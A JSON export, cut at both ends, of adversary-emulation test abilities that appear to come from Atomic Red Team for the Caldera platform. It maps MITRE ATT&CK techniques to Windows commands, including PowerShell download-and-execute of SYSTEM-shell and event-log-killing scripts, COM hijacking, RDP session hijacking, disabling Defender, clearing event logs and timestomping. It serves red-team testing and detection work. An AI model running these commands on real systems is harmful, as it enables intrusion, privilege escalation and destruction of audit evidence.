                    "command": "reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\AtomicTest\" /ve /T REG_SZ /d \"AtomicTest\" /f; reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\AtomicTest.1.00\" /ve /T REG_SZ /d \"AtomicTest\" /f; reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\AtomicTest\\CLSID\" /ve /T REG_SZ /d \"{00000001-0000-0000-0000-0000FEEDACDC}\" /f; reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\AtomicTest.1.00\\CLSID\" /ve /T REG_SZ /d \"{00000001-0000-0000-0000-0000FEEDACDC}\" /f; reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\" /f; reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\" /ve /T REG_SZ /d \"AtomicTest\" /f; reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\\InprocServer32\" /ve /T REG_SZ /d \"C:\\WINDOWS\\system32\\scrobj.dll\" /f; reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\\InprocServer32\" /v \"ThreadingModel\" /T REG_SZ /d \"Apartment\" /f; reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\\ProgID\" /ve /T REG_SZ /d \"AtomicTest\" /f; reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\\ScriptletURL\" /ve /T REG_SZ /d \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.015/src/TreatAs.sct\" /f; reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\\VersionIndependentProgID\" /ve /T REG_SZ /d \"AtomicTest\" /f; reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\" /f; reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\\TreatAs\" /ve /T REG_SZ /d \"{00000001-0000-0000-0000-0000FEEDACDC}\" /f; rundll32.exe -sta \"AtomicTest\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "2db3b2385ba856424bfe130f69fc0529",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "fdc26580786ac9d3ffc38aea053cbd29": {
        "description": "Get SYSTEM shell - Pop System Shell using Token Manipulation technique via function of WinPwn",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1134.002",
            "name": "Create Process with Token"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/TokenManipulation/Get-WinlogonTokenSystem.ps1');Get-WinLogonTokenSystem",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "fdc26580786ac9d3ffc38aea053cbd29",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "e643e21318c069d0a576da91650c76fe": {
        "description": "Powershell Enable WinRM\n\nUpon successful execution, powershell will \"Enable-PSRemoting\" allowing for remote PS access.\n",
        "tactic": "lateral-movement",
        "technique": {
            "attack_id": "T1021.006",
            "name": "Remote Services: Windows Remote Management"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Enable-PSRemoting -Force",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "e643e21318c069d0a576da91650c76fe",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "c51dc4d1537961d9a3d9afe6654905c9": {
        "description": "An adversary may attempt to use Evil-WinRM with a valid account to interact with remote systems that have WinRM enabled",
        "tactic": "lateral-movement",
        "technique": {
            "attack_id": "T1021.006",
            "name": "Remote Services: Windows Remote Management"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "evil-winrm -i Target -u Domain\\Administrator -p P@ssw0rd1",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "c51dc4d1537961d9a3d9afe6654905c9",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "fe8f012ae5cdde2d5e3bba7b8ea95d93": {
        "description": "Connecting To Remote Shares\n",
        "tactic": "lateral-movement",
        "technique": {
            "attack_id": "T1021.002",
            "name": "Remote Services: SMB/Windows Admin Shares"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "cmd.exe /c \"net use \\\\Target\\C$ P@ssw0rd1 /u:DOMAIN\\Administrator\"",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "fe8f012ae5cdde2d5e3bba7b8ea95d93",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "5f2a68667604f0e3f8188d2a083fbcc5": {
        "description": "Attempt an RDP session via Remote Desktop Application over Powershell\n",
        "tactic": "lateral-movement",
        "technique": {
            "attack_id": "T1021.001",
            "name": "Remote Services: Remote Desktop Protocol"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "$p=Tasklist /svc /fi \"IMAGENAME eq mstsc.exe\" /fo csv | convertfrom-csv; if(-not ([string]::IsNullOrEmpty($p.PID))) { Stop-Process -Id $p.PID }",
                    "command": "$Server=\"#{logonserver}\"; $User=\"#{username}\"; $Password=\"#{password}\"; cmdkey /generic:TERMSRV/$Server /user:$User /pass:$Password; mstsc /v:$Server; echo \"RDP connection established\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "5f2a68667604f0e3f8188d2a083fbcc5",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "dd67068b052fa553ad4a0ac7d6a5ea89": {
        "description": "Changing RDP Port to Non Standard Port via Command_Prompt\n",
        "tactic": "lateral-movement",
        "technique": {
            "attack_id": "T1021.001",
            "name": "Remote Services: Remote Desktop Protocol"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v PortNumber /t REG_DWORD /d 3389 -f >nul 2>&1 && netsh advfirewall firewall delete rule name=\"RDPPORTLatest-TCP-In\" >nul 2>&1",
                    "command": "reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v PortNumber /t REG_DWORD /d 4489 -f && netsh advfirewall firewall add rule name=\"RDPPORTLatest-TCP-In\" dir=in action=allow protocol=TCP localport=4489",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "dd67068b052fa553ad4a0ac7d6a5ea89",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "716745153b22c35bf39d177e28ce7bf6": {
        "description": "Copies a file to a remote host and executes it using PsExec. Requires the download of PsExec from [https://docs.microsoft.com/en-us/sysinternals/downloads/psexec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec).\n",
        "tactic": "lateral-movement",
        "technique": {
            "attack_id": "T1021.002",
            "name": "Remote Services: SMB/Windows Admin Shares"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "C:\\PSTools\\PsExec.exe \\\\localhost -accepteula -c C:\\Windows\\System32\\cmd.exe",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "716745153b22c35bf39d177e28ce7bf6",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "d39f399d75f3dcb5ab753f70f47449b0": {
        "description": "Powershell lateral movement using the mmc20 application com object.\n\nReference:\n\nhttps://blog.cobaltstrike.com/2017/01/24/scripting-matt-nelsons-mmc20-application-lateral-movement-technique/\n\nUpon successful execution, cmd will spawn calc.exe on a remote computer.\n",
        "tactic": "lateral-movement",
        "technique": {
            "attack_id": "T1021.003",
            "name": "Remote Services: Distributed Component Object Model"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "[activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.application\",\"localhost\")).Document.ActiveView.ExecuteShellCommand(\"c:\\windows\\system32\\calc.exe\", $null, $null, \"7\")",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "d39f399d75f3dcb5ab753f70f47449b0",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "0dceba0336f08525bbd06a05c7b4e671": {
        "description": "Changing RDP Port to Non Standard Port via Remote Desktop Application over Powershell\n",
        "tactic": "lateral-movement",
        "technique": {
            "attack_id": "T1021.001",
            "name": "Remote Services: Remote Desktop Protocol"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Set-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp' -name \"PortNumber\" -Value 3389; Remove-NetFirewallRule -DisplayName \"RDPPORTLatest-TCP-In\" -ErrorAction ignore",
                    "command": "Set-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp' -name \"PortNumber\" -Value 4489; New-NetFirewallRule -DisplayName 'RDPPORTLatest-TCP-In' -Profile 'Public' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 4489",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "0dceba0336f08525bbd06a05c7b4e671",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "6b96fa3cbc72bc6771572a924a31b15d": {
        "description": "Map Admin share utilizing PowerShell\n",
        "tactic": "lateral-movement",
        "technique": {
            "attack_id": "T1021.002",
            "name": "Remote Services: SMB/Windows Admin Shares"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "New-PSDrive -name g -psprovider filesystem -root \\\\Target\\C$",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "6b96fa3cbc72bc6771572a924a31b15d",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "2a3209689a6452c07f869f45414cbb4c": {
        "description": "Attempt an RDP session via Remote Desktop Application to a DomainController.\n",
        "tactic": "lateral-movement",
        "technique": {
            "attack_id": "T1021.001",
            "name": "Remote Services: Remote Desktop Protocol"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "$p=Tasklist /svc /fi \"IMAGENAME eq mstsc.exe\" /fo csv | convertfrom-csv; if(-not ([string]::IsNullOrEmpty($p.PID))) { Stop-Process -Id $p.PID }",
                    "command": "if((Get-CIMInstance -Class Win32_ComputerSystem) { ; } else {Write-Host Joining this computer to a domain must be done manually};  ;  $Server=#{logonserver}; $User = Join-Path; $Password=\"#{password}\"; cmdkey /generic:TERMSRV/$Server /user:$User /pass:$Password; mstsc /v:$Server; echo \"RDP connection established\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "2a3209689a6452c07f869f45414cbb4c",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "34020258ec67d5ceaaa6ad892639e69d": {
        "description": "Executes a command, writing the output to a local Admin Share.\nThis technique is used by post-exploitation frameworks.\n",
        "tactic": "lateral-movement",
        "technique": {
            "attack_id": "T1021.002",
            "name": "Remote Services: SMB/Windows Admin Shares"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "cmd.exe /Q /c hostname 1> \\\\127.0.0.1\\ADMIN$\\output.txt 2>&1",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "34020258ec67d5ceaaa6ad892639e69d",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "074d51849fdc79a40166c296850db7b1": {
        "description": "Execute Invoke-command on remote host.\n\nUpon successful execution, powershell will execute whoami on specified remote host using `invoke-command`.\n",
        "tactic": "lateral-movement",
        "technique": {
            "attack_id": "T1021.006",
            "name": "Remote Services: Windows Remote Management"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$SecPassword = ConvertTo-SecureString \"test12345\" -AsPlainText -Force; $Cred = New-Object System.Management.Automation.PSCredential(\"$env:USERNAME\", $SecPassword); Invoke-Command -ComputerName \"$env:COMPUTERNAME\" -Credential $Cred -ScriptBlock {whoami}",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "074d51849fdc79a40166c296850db7b1",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "153663bd4b750eca453d844cda61a37a": {
        "description": "[RDP hijacking](https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6) - how to hijack RDS and RemoteApp sessions transparently to move through an organization\n",
        "tactic": "lateral-movement",
        "technique": {
            "attack_id": "T1563.002",
            "name": "Remote Service Session Hijacking: RDP Hijacking"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "sc.exe delete sesshijack >nul 2>&1",
                    "command": "query user && sc.exe create sesshijack binpath= \"cmd.exe /k tscon 1337 /dest:rdp-tcp#55\" && net start sesshijack",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "153663bd4b750eca453d844cda61a37a",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "22a16d5deb5384e691abf943cefad75b": {
        "description": "Uses hh.exe to execute a local compiled HTML Help payload.\nUpon execution calc.exe will open\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218.001",
            "name": "Signed Binary Proxy Execution: Compiled HTML File"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "hh.exe 9e2e6f_T1218.001.chm",
                    "payloads": [
                        "9e2e6f_T1218.001.chm"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "22a16d5deb5384e691abf943cefad75b",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "47ba984c0c40a7c41b4797156c1a5f96": {
        "description": "Kill Windows Event Log Service Threads using Invoke-Phant0m. WARNING you will need to restart PC to return to normal state with Log Service. https://artofpwn.com/phant0m-killing-windows-event-log.html",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1562.002",
            "name": "Impair Defenses: Disable Windows Event Logging"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Write-Host \"NEED TO Restart-Computer TO ENSURE LOGGING RETURNS\" -fore red; Remove-Item \"$env:TEMP\\Invoke-Phant0m.ps1\" -ErrorAction Ignore",
                    "command": "Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned -ErrorAction Ignore; $url = \"https://raw.githubusercontent.com/hlldz/Invoke-Phant0m/f1396c411a867e1b471ef80c5c534466103440e0/Invoke-Phant0m.ps1\"; $output = \"$env:TEMP\\Invoke-Phant0m.ps1\"; $wc = New-Object System.Net.WebClient; $wc.DownloadFile($url, $output); cd $env:TEMP; Import-Module .\\Invoke-Phant0m.ps1; Invoke-Phant0m",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "47ba984c0c40a7c41b4797156c1a5f96",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "9d21f3b551b40fa40056af1244af56ee": {
        "description": "The following Atomic test simulates adding a generic non-malicious certificate to the CurrentUser certificate store. This behavior generates a registry modification that adds the cloned root CA certificate in the keys outlined in the blog.\nKeys will look like - \\SystemCertificates\\CA\\Certificates or \\SystemCertificates\\Root\\Certificates\nReference: https://posts.specterops.io/code-signing-certificate-cloning-attacks-and-defenses-6f98657fc6ec\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1553.004",
            "name": "Subvert Trust Controls: Install Root Certificate"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Get-ChildItem -Path Cert:\\ -Recurse | Where-Object { $_.Thumbprint -eq '1F3D38F280635F275BE92B87CF83E40E40458400' } | remove-item",
                    "command": "IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing)",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "9d21f3b551b40fa40056af1244af56ee",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "4df316c222125fe7372723c5b3434977": {
        "description": "Lockbit Black - Use Registry Editor to turn on automatic logon\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1562.001",
            "name": "Impair Defenses: Disable or Modify Tools"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name AutoAdminLogon -Force -ErrorAction Ignore; Remove-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name DefaultUserName -Force -ErrorAction Ignore; Remove-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name DefaultDomainName -Force -ErrorAction Ignore; Remove-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name DefaultPassword -Force -ErrorAction Ignore",
                    "command": "New-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name AutoAdminLogon -PropertyType DWord -Value 1 -Force; New-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name DefaultUserName -Value Administrator -Force; New-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name DefaultDomainName -Value contoso.com -Force; New-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name DefaultPassword  -Value password1 -Force",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "4df316c222125fe7372723c5b3434977",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "c3a3d3282e88bb4f80109be9afbd6e94": {
        "description": "Delete a single file from the temporary directory using cmd.exe.\nUpon execution, no output will be displayed. Use File Explorer to verify the file was deleted.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1070.004",
            "name": "Indicator Removal on Host: File Deletion"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "del /f %temp%\\deleteme_T1551.004",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "c3a3d3282e88bb4f80109be9afbd6e94",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "29b7a018dce0877b3d2292286a0f512f": {
        "description": "Attempting to disable scheduled scanning and other parts of windows defender atp. These commands must be run as System, so they still fail as administrator.\nHowever, adversaries do attempt to perform this action so monitoring for these command lines can help alert to other bad things going on. Upon execution, \"Access Denied\"\nwill be displayed twice and the WinDefend service status will be displayed.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1562.001",
            "name": "Impair Defenses: Disable or Modify Tools"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "sc start WinDefend >nul 2>&1 && sc config WinDefend start=enabled >nul 2>&1",
                    "command": "sc stop WinDefend && sc config WinDefend start=disabled && sc query WinDefend",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "29b7a018dce0877b3d2292286a0f512f",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "3022facafc3264afd24940cb51e262f6": {
        "description": "When C# is compiled dynamically, a .cmdline file will be created as a part of the process. \nCertain processes are not typically observed compiling C# code, but can do so without touching disk. This can be used to unpack a payload for execution.\nThe exe file that will be executed is named as T1027.004_DynamicCompile.exe is containted in the 'bin' folder of this atomic, and the source code to the file is in the 'src' folder.\nUpon execution, the exe will print 'T1027.004 Dynamic Compile'.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1027.004",
            "name": "Obfuscated Files or Information: Compile After Delivery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Invoke-Expression 893687_T1027.004_DynamicCompile.exe",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": [
                        "893687_T1027.004_DynamicCompile.exe"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "3022facafc3264afd24940cb51e262f6",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "6ac8f48413127289ac42b76a0785b08f": {
        "description": "Disable Show Hidden files switch in registry. This technique was abused by several malware to hide their files from normal user.\nSee how this trojan abuses this technique - https://www.sophos.com/en-us/threat-center/threat-analyses/viruses-and-spyware/W32~Tiotua-P/detailed-analysis.aspx \n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1564.001",
            "name": "Hide Artifacts: Hidden Files and Directories"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\" /v ShowSuperHidden /f >nul 2>&1 && reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\" /v Hidden /f >nul 2>&1",
                    "command": "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v ShowSuperHidden /t REG_DWORD /d 0 /f && reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v Hidden /t REG_DWORD /d 0 /f",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "6ac8f48413127289ac42b76a0785b08f",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "effd1be56656c570e7d336f2b3673868": {
        "description": "Rundll32.exe running non-dll \n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218.011",
            "name": "Signed Binary Proxy Execution: Rundll32"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "rundll32.exe C:\\Users\\$env:username\\Downloads\\calc.png, StartW",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "effd1be56656c570e7d336f2b3673868",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "6fa417fb183d6c20a67e617c0249f04f": {
        "description": "Clear event logs using built-in PowerShell commands.\nUpon successful execution, you should see the list of deleted event logs\nUpon execution, open the Security.evtx logs at C:\\Windows\\System32\\winevt\\Logs and verify that it is now empty or has very few logs in it.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1070.001",
            "name": "Indicator Removal on Host: Clear Windows Event Logs"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$logs = Get-EventLog -List | ForEach-Object {$_.Log}; $logs | ForEach-Object {Clear-EventLog -LogName $_ }; Get-EventLog -list",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "6fa417fb183d6c20a67e617c0249f04f",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "a0e49f8a47a0ae3e5d8f04c12b594432": {
        "description": "Modifies the last access timestamp of a specified file. This technique was seen in use by the Stitch RAT.\nTo verify execution, use File Explorer to view the Properties of the file and observe that the Accessed time is the year 1970.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1070.006",
            "name": "Indicator Removal on Host: Timestomp"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Get-ChildItem $env:TEMP\\T1551.006_timestomp.txt | % { $_.LastAccessTime = \"01/01/1970 00:00:00\" }",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "a0e49f8a47a0ae3e5d8f04c12b594432",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "c9e136f0a985036874bc596510a4cacd": {
        "description": "Rundll32.exe loading an executable renamed as .scr using desk.cpl \nReference: \n  - [LOLBAS - Libraries/Desk](https://lolbas-project.github.io/lolbas/Libraries/Desk/)\nSIGMA rules:\n  - [SCR File Write Event](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/file_event/file_event_win_new_src_file.yml)\n  - [Rundll32 InstallScreenSaver Execution](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_rundll32_installscreensaver.yml)\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218.011",
            "name": "Signed Binary Proxy Execution: Rundll32"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "del not_an_scr.scr",
                    "command": "copy %windir%\\System32\\calc.exe not_an_scr.scr && rundll32.exe desk.cpl,InstallScreenSaver not_an_scr.scr",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "c9e136f0a985036874bc596510a4cacd",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "f6e9ca79df57e0aeccf0b369de58d1fc": {
        "description": "Recursively delete a folder in the temporary directory using Powershell. Upon execution, no output will be displayed. Use File Explorer to verify the folder was deleted.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1070.004",
            "name": "Indicator Removal on Host: File Deletion"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Remove-Item -Path $env:TEMP\\deleteme_folder_T1551.004 -Recurse",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "f6e9ca79df57e0aeccf0b369de58d1fc",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "9d2e91b9241ae43b517be2be98bddfd9": {
        "description": "Manages the update sequence number (USN) change journal, which provides a persistent log of all changes made to files on the volume. Upon execution, no output\nwill be displayed. More information about fsutil can be found at https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/fsutil-usn\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1070",
            "name": "Indicator Removal on Host"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "fsutil usn createjournal m=1000 a=100 c:",
                    "command": "fsutil usn deletejournal /D C:",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "9d2e91b9241ae43b517be2be98bddfd9",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "dce51e632abdfe5392c7c1f942ac9273": {
        "description": "Creates a file and marks it as a system file using the attrib.exe utility. Upon execution, open the file in file explorer then open Properties > Details\nand observe that the Attributes are \"SA\" for System and Archive.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1564.001",
            "name": "Hide Artifacts: Hidden Files and Directories"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "del /A:S %temp%\\T1564.001.txt >nul 2>&1",
                    "command": "attrib.exe +s %temp%\\T1564.001.txt",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "dce51e632abdfe5392c7c1f942ac9273",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "e973a33ed29e267eb4f2e895489d3899": {
